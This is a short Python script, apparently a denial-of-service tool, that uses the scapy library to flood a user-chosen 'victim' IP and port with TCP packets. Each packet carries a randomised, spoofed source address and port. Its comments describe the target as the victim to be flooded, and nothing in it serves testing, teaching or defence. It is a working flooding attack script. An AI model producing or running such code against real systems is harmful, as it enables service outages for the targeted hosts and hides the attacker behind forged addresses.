#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
from time import sleep
from scapy.all import*

def TCP_RAND_IP_RAND_PORT():
	i = 1

	vicip = raw_input("Please input the target IP Address:  ") #the victim which will be flooded
	print("\n")

	vicport = int(input("Please input the target Port:  ")) #the port we want to target
	print("\n")

	max_packets = int(input("Please input the maximum amount of packets to be sent to the server:   ")) #sets the max packets

	while i < max_packets+1:
	  srcip = RandIP()
	  IPLayer = IP(dst=vicip, src=srcip)
	  TCPLayer = TCP(sport = RandShort(), dport=vicport)
	  pkt = IPLayer/TCPLayer
	  send(pkt, inter=0.001)
	  i += 1
